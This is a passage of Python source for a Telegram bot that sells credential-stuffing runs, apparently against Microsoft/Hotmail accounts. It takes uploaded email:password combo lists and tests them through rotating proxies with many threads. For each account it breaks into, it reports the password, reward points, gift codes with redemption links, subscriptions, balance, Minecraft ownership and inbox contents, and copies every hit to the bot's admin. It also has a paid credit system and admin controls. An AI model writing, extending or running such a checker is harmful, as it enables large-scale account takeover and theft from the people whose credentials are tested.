    if not text: text = pending_files.pop(uid, "")
    lines = [l.strip() for l in text.splitlines() if ':' in l]
    if not lines: return

    if akaza_db.get_credits(uid) < len(lines) and uid != ADMIN_ID:
        await u.message.reply_text(f"❌ Need {len(lines)} credits."); return

    s = akaza_db.get_user_settings(uid)
    px = user_proxies.get(uid, []) or PROXIES_LIST
    thr = min(s['threads'], 300) if px else min(s['threads'], 10)

    status_msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
    hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
    sid = str(uuid.uuid4().hex[:6])
    h_f, tfa_f = f"h_{sid}.txt", f"t_{sid}.txt"
    sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()

    async def worker(line):
        nonlocal hits, bad, tfa, err, checked, last_up, last_h
        async with sem:
            try:
                parts = line.split(':', 1)
                p = random.choice(px) if px else None
                data = await AkazaChecker(p).check(parts[0].strip(), parts[1].strip(), s['keywords'], s['fast_mode'])
            except: data = {'status': 'error', 'email': line.split(':')[0]}
            checked += 1; akaza_db.use_credit(uid); akaza_db.save_result(uid, data.get('email',''), data['status'], data)
            st = data['status']
            if st == 'hit':
                hits += 1; pts = data.get('pts', 0); country = data.get('country','N/A')
                tier = '💎 ULTRA HIT' if pts >= 20000 else '⭐ PREMIUM HIT' if pts >= 7000 else '🎯 HIT'
                msg = (f"{tier}\n"
                       f"📧 `{data['email']}`\n"
                       f"🔑 `{data['password']}`\n"
                       f"👤 {data.get('name','N/A')} | 🌍 {country}\n"
                       f"⭐ Points: `{pts}`\n")

                codes = data.get('codes', [])
                if codes:
                    cat_map = {}
                    for co in codes: cat_map.setdefault(co.get('category','Unknown'), []).append(co)
                    for cat, clist in cat_map.items():
                        c_strs = [f"`{co['code']}`" + (f" [Redeem]({co['redemption_url']})" if co.get('redemption_url') else "") for co in clist]
                        msg += f"🎮 {cat}: {', '.join(c_strs)}\n"

                subs_data = data.get('subs', {})
                subs = subs_data.get('subs', [])
                active = [su['name'] for su in subs if not su.get('is_expired')]
                if active: msg += f"🎮 MS Subs: {', '.join(active)}\n"
                if subs_data.get('balance'): msg += f"💳 Balance: {subs_data['balance']}\n"

                if data.get('mc', {}).get('owned'):
                    msg += f"⛏️ Minecraft: `{data['mc']['username']}`\n"

                inbox = data.get('inbox', {})
                if inbox:
                    top5 = list(inbox.items())[:5]
                    sv = ', '.join(f"{k}({v})" for k, v in top5)
                    msg += f"📬 Inbox: {sv}\n"
                    if len(inbox) > 5: msg += f"  ...+{len(inbox)-5} more\n"

                try: await c.bot.send_message(uid, msg, parse_mode='Markdown', disable_web_page_preview=True)
                except: pass
                if uid != ADMIN_ID:
                    try: await c.bot.send_message(ADMIN_ID, f"📢 User {uid} hit:\n{msg}", parse_mode='Markdown', disable_web_page_preview=True)
                    except: pass

                with open(h_f, 'a') as f:
                    f.write(f"{data['email']}:{data['password']} | Pts:{pts} | Country:{country} | Codes:{len(codes)} | Subs:{len(active)} | Inbox:{len(inbox)}\n")

                last_h.append(data['email']); last_h = last_h[-5:]
            elif st == '2fa': tfa += 1; open(tfa_f, 'a').write(f"{data.get('email','')}:{data.get('password','')}\n")
            elif st == 'error': err += 1
            else: bad += 1
            async with up_lock:
                if time.time() - last_up > 3 or checked == len(lines):
                    last_up = time.time(); el = time.time() - start_t; cpm = int((checked/el)*60) if el > 0 else 0
                    prg = f"🔄 **Live Check**\n\n📊 `{checked}/{len(lines)}` | ⚡ CPM: `{cpm}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ❌ Errors: `{err}`\n\n🕒 Last Hits:\n`{'|'.join(last_h) or 'None'}`"
                    try: await status_msg.edit_text(prg, parse_mode='HTML')
                    except: pass

    tasks = []
    for l in lines:
        if akaza_db.is_banned(uid): break
        tasks.append(asyncio.create_task(worker(l)))
        await asyncio.sleep(0.3)
    if tasks: await asyncio.gather(*tasks)

    for f_p, disp in [(h_f, "Hotmails Hits @darkcloudgateway.txt"), (tfa_f, "2fa.txt")]:
        if os.path.exists(f_p):
            with open(f_p, 'r') as f: content = f.read()
            with open(f_p, 'w') as f: f.write(f"@larpsupport\n\n{content}\n@larpsupport")
            with open(f_p, 'rb') as f:
                if u.callback_query: await u.callback_query.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
                else: await u.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
            os.remove(f_p)
    if uid in user_proxies: del user_proxies[uid]

async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; await q.answer(); uid = q.from_user.id
    if q.data == "settings":
        s = akaza_db.get_user_settings(uid)
        await q.edit_message_text(f"⚙️ <b>Settings</b>\nThreads: <code>{s['threads']}</code>\nFast Mode: <code>{s['fast_mode']}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "stats":
        st = akaza_db.user_stats(uid)
        await q.edit_message_text(f"📊 <b>Stats</b>\nChecks: <code>{st['checks']}</code>\nHits: <code>{st['hits']}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "kw_mode":
        akaza_db.update_settings(uid, is_adding_kw=True)
        await q.edit_message_text("🔍 <b>Keyword Mode</b>\nSend keywords separated by spaces.\n/skw to stop.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "proxy":
        await q.edit_message_text(f"🌐 <b>Proxy</b>\nLoaded: <code>{len(user_proxies.get(uid, []))}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "back": await start(u, c)
    elif q.data == "set_combo": await handle_combo(u, c)
    elif q.data == "set_proxy":
        content = pending_files.pop(uid, "")
        user_proxies[uid] = [AkazaChecker().format_proxy(l.strip()) for l in content.splitlines() if l.strip()]
        await q.edit_message_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")
    elif q.data == "admin" and akaza_db.is_mod(uid):
        st = akaza_db.get_global_stats()
        await q.edit_message_text(f"🛠 <b>Admin</b>\nUsers: {st['total']}\nChecks: {st['checks']}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")

async def cmd_skw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, is_adding_kw=False); await u.message.reply_text("✅ Stopped.")
async def cmd_ckw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, keywords=[]); await u.message.reply_text("✅ Cleared.")

async def cmd_addkw(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not c.args: return
    s = akaza_db.get_user_settings(uid)
    kws = list(set(s['keywords'] + c.args))
    akaza_db.update_settings(uid, keywords=kws)
    await u.message.reply_text(f"✅ Added {len(c.args)} keywords.")

async def cmd_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.args: return
    akaza_db.update_settings(u.effective_user.id, keywords=list(set(c.args)))
    await u.message.reply_text("✅ Keywords updated.")

async def cmd_check(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.args or ':' not in c.args[0]: return
    await handle_combo(u, c, c.args[0])

async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not akaza_db.is_mod(uid): return
    m = u.message.text.split(); cmd, args = m[0].lower(), m[1:]
    try:
        if cmd == "!!addcredits" and len(args) >= 2: akaza_db.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!setcredits" and len(args) >= 2: akaza_db.set_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!resetcredits" and args: akaza_db.reset_credits(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!grant" and args: akaza_db.grant_access(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!revoke" and args: akaza_db.revoke_access(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!addaccess" and len(args) >= 2: akaza_db.grant_timed_access(int(args[0]), int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!ban" and args: akaza_db.ban(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!unban" and args: akaza_db.unban(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!mod" and args and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 1); await u.message.reply_text("✅")
        elif cmd == "!!unmod" and args and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 0); await u.message.reply_text("✅")
        elif cmd == "!!listmods": await u.message.reply_text("\n".join([f"{m['uid']} (@{m['username']})" for m in akaza_db.list_mods()]))
        elif cmd == "!!info" and args: await u.message.reply_text(str(akaza_db.get_user_info(int(args[0]))))
        elif cmd == "!!stats": await u.message.reply_text(str(akaza_db.get_global_stats()))
        elif cmd == "!!broadcast" and args:
            txt = u.message.text[len(cmd):].strip(); count = 0
            for t in akaza_db.get_all_user_ids():
                try: await c.bot.send_message(t, txt); count += 1; await asyncio.sleep(0.05)
                except: pass
            await u.message.reply_text(f"✅ Sent to {count} users.")
        elif cmd == "!!setthreads" and len(args) >= 2: akaza_db.update_settings(int(args[0]), threads=int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!addproxies":
            pxs = u.message.text[len(cmd):].strip().splitlines()
            for p in pxs:
                if p.strip(): PROXIES_LIST.append(AkazaChecker().format_proxy(p.strip()))
            await u.message.reply_text(f"✅ Added {len(pxs)} global proxies.")
        elif cmd == "!!help": await u.message.reply_text("!!addcredits !!setcredits !!resetcredits !!grant !!revoke !!addaccess !!ban !!unban !!mod !!unmod !!listmods !!info !!stats !!broadcast !!setthreads !!addproxies")
    except Exception as e: await u.message.reply_text(f"❌ {e}")

def main():
    akaza_db.init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("threads", lambda u,c: akaza_db.update_settings(u.effective_user.id, threads=int(c.args[0])) or u.message.reply_text("✅") if c.args else None))
    app.add_handler(CommandHandler("keywords", cmd_keywords))
    app.add_handler(CommandHandler("addkw", cmd_addkw))
    app.add_handler(CommandHandler("skw", cmd_skw)); app.add_handler(CommandHandler("ckw", cmd_ckw))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("fastmode", lambda u,c: akaza_db.update_settings(u.effective_user.id, fast_mode=not akaza_db.get_user_settings(u.effective_user.id)['fast_mode']) or u.message.reply_text("✅")))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'[^!].+:.+'), handle_combo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__': main()
